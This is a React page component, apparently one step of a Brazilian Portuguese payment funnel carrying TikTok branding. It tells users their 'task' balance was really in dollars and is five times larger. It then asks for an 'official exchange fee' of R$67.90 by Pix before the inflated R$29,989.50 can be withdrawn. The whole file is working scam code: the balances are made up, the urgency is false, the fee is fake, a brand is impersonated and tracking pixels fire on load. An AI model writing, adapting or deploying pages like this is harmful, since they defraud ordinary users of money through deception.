import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import PixPaymentPopup from '@/components/PixPaymentPopup';
import { trackViewContent, trackClickButton } from '@/lib/tiktokPixel';
import '../styles/app.css';

const SALDO_ATUAL = 4287.90;
const SALDO_CONVERTIDO = 29989.50;
const TAXA_CAMBIO = 67.90;
const TAXA_CAMBIO_CENTAVOS = 6790;

const formatBR = (value: number) => {
  return value
    .toFixed(2)
    .replace('.', ',')
    .replace(/\B(?=(\d{3})+(?!\d))/g, '.');
};

const Up5 = () => {
  const navigate = useNavigate();
  const [showPixPopup, setShowPixPopup] = useState(false);

  useEffect(() => {
    trackViewContent('Taxa de Câmbio', TAXA_CAMBIO);
  }, []);

  const handlePaymentSuccess = () => {
    setShowPixPopup(false);
    navigate('/up6');
  };

  return (
    <main style={{ backgroundColor: '#f5f5f5', minHeight: '100vh', paddingBottom: '40px' }}>
      {/* Header */}
      <div style={{
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        padding: '16px',
        gap: '6px',
      }}>
        <img src="/images/tiktok-logo.png" alt="TikTok" style={{ height: '28px' }} />
      </div>

      {/* Alert Card */}
      <div style={{
        backgroundColor: '#fff',
        borderRadius: '12px',
        margin: '0 12px 12px',
        padding: '32px 20px',
        fontFamily: 'Inter, system-ui, sans-serif',
        textAlign: 'center',
      }}>
        <div style={{ fontSize: '48px', marginBottom: '20px' }}>🇺🇸</div>

        <h1 style={{
          fontSize: '20px',
          fontWeight: 700,
          color: '#000',
          margin: '0 0 16px',
          lineHeight: 1.4,
          textTransform: 'uppercase',
        }}>
          PARE! SEU SALDO NÃO É DE R$ {formatBR(SALDO_ATUAL)}. O SISTEMA IDENTIFICOU QUE O VALOR ORIGINAL ESTÁ EM DÓLARES!
        </h1>

        <p style={{
          fontSize: '14px',
          color: '#666',
          margin: 0,
          lineHeight: 1.6,
        }}>
          Acabamos de receber um alerta do servidor internacional. As tarefas foram patrocinadas por empresas americanas e seu saldo foi mostrado na moeda errada.
        </p>
      </div>

      {/* What it means Card */}
      <div style={{
        backgroundColor: '#fff',
        borderRadius: '12px',
        margin: '0 12px 12px',
        padding: '24px 20px',
        fontFamily: 'Inter, system-ui, sans-serif',
      }}>
        <h2 style={{
          fontSize: '16px',
          fontWeight: 600,
          color: '#000',
          margin: '0 0 16px',
          textAlign: 'center',
        }}>
          O que isso significa?
        </h2>

        <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
          {[
            'Seu saldo real é 5 VEZES MAIOR que o mostrado.',
            'O valor está travado em Dólares (USD).',
            'Necessário realizar a conversão imediata para Sacar.',
          ].map((item, idx) => (
            <div key={idx} style={{
              display: 'flex',
              alignItems: 'flex-start',
              gap: '12px',
            }}>
              <div style={{
                width: '24px',
                height: '24px',
                borderRadius: '50%',
                backgroundColor: '#22c55e',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                flexShrink: 0,
              }}>
                <span style={{ color: '#fff', fontSize: '14px' }}>✓</span>
              </div>
              <span style={{ fontSize: '14px', color: '#000', lineHeight: 1.5 }}>{item}</span>
            </div>
          ))}
        </div>
      </div>

      {/* Math Card */}
      <div style={{
        backgroundColor: '#fff',
        borderRadius: '12px',
        margin: '0 12px 12px',
        padding: '24px 20px',
        fontFamily: 'Inter, system-ui, sans-serif',
      }}>
        <h2 style={{
          fontSize: '16px',
          fontWeight: 600,
          color: '#000',
          margin: '0 0 20px',
          textAlign: 'center',
        }}>
          A Matemática da Conversão:
        </h2>

        <div style={{
          display: 'flex',
          justifyContent: 'space-between',
          alignItems: 'center',
          paddingBottom: '14px',
          borderBottom: '1px solid #f1f1f1',
          marginBottom: '14px',
        }}>
          <span style={{ fontSize: '14px', color: '#444' }}>Saldo Atual Visualizado</span>
          <span style={{ fontSize: '16px', fontWeight: 600, color: '#000' }}>R$ {formatBR(SALDO_ATUAL)}</span>
        </div>

        <div style={{
          display: 'flex',
          justifyContent: 'space-between',
          alignItems: 'center',
          backgroundColor: '#fffbeb',
          padding: '14px',
          borderRadius: '8px',
          marginBottom: '14px',
        }}>
          <span style={{ fontSize: '14px', color: '#444' }}>Fator Multiplicador (USD)</span>
          <span style={{ fontSize: '16px', fontWeight: 600, color: '#d97706' }}>5x (Cotação Atual)</span>
        </div>

        <div style={{
          display: 'flex',
          justifyContent: 'space-between',
          alignItems: 'center',
          paddingBottom: '20px',
          borderBottom: '1px solid #f1f1f1',
          marginBottom: '20px',
        }}>
          <span style={{ fontSize: '14px', color: '#444' }}>Status da Conversão</span>
          <span style={{ fontSize: '16px', fontWeight: 600, color: '#ef4444' }}>Pendente</span>
        </div>

        <div style={{
          display: 'flex',
          justifyContent: 'space-between',
          alignItems: 'center',
        }}>
          <span style={{ fontSize: '16px', fontWeight: 700, color: '#000' }}>NOVO SALDO<br />CONVERTIDO:</span>
          <div style={{ textAlign: 'right' }}>
            <span style={{ fontSize: '14px', color: '#000' }}>R$</span>
            <span style={{ fontSize: '32px', fontWeight: 700, color: '#000', marginLeft: '4px' }}>
              {formatBR(SALDO_CONVERTIDO).split(',')[0]},
            </span>
            <span style={{ fontSize: '20px', fontWeight: 700, color: '#000' }}>
              {formatBR(SALDO_CONVERTIDO).split(',')[1]}
            </span>
          </div>
        </div>
      </div>

      {/* CTA Card */}
      <div style={{
        backgroundColor: '#fff',
        borderRadius: '12px',
        margin: '0 12px',
        padding: '24px 20px',
        fontFamily: 'Inter, system-ui, sans-serif',
        textAlign: 'center',
      }}>
        <p style={{
          fontSize: '14px',
          color: '#444',
          margin: '0 0 20px',
          lineHeight: 1.6,
        }}>
          Para corrigir isso e converter o valor total para sua conta bancária brasileira, precisamos pagar a Taxa de Câmbio Oficial.
        </p>

        <button
          onClick={() => setShowPixPopup(true)}
          style={{
            width: '100%',
            padding: '16px',
            backgroundColor: '#fe2b54',
            color: '#fff',
            border: 'none',
            borderRadius: '12px',
            fontSize: '14px',
            fontWeight: 600,
            cursor: 'pointer',
            lineHeight: 1.4,
          }}
        >
          PAGAR TAXA DE CÂMBIO E SACAR R$ {formatBR(SALDO_CONVERTIDO)}
        </button>

        <p style={{
          fontSize: '13px',
          color: '#666',
          marginTop: '12px',
          marginBottom: 0,
        }}>
          Valor da taxa de conversão: R$ {formatBR(TAXA_CAMBIO)}
        </p>
      </div>

      {showPixPopup && (
        <PixPaymentPopup
          amount={TAXA_CAMBIO_CENTAVOS}
          description="Taxa de Câmbio Oficial"
          onSuccess={handlePaymentSuccess}
          onClose={() => setShowPixPopup(false)}
        />
      )}
    </main>
  );
};

export default Up5;
